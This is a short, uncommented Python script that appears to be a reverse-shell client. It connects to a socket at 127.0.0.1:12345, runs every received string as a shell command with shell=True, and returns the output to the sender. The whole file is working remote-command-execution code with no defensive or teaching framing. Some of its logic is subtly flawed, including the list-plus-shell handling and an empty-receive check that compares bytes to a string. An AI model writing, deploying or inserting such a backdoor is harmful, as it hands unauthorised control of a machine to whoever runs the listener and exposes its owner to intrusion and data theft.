import socket
import threading
import time
import subprocess

def tcp_client():
    host = "127.0.0.1"
    port = 12345
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        rec = s.recv(1024)
        if rec != None and rec !="":
                try:
                    cmd = rec.decode().strip().split(" ")
                    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
                    out= result.stderr.strip() if result.stderr else result.stdout.strip()
                    s.sendall(out.encode())

                except:
                    s.sendall("Error".encode())

client_thread = threading.Thread(target=tcp_client, daemon=True)
client_thread.start()
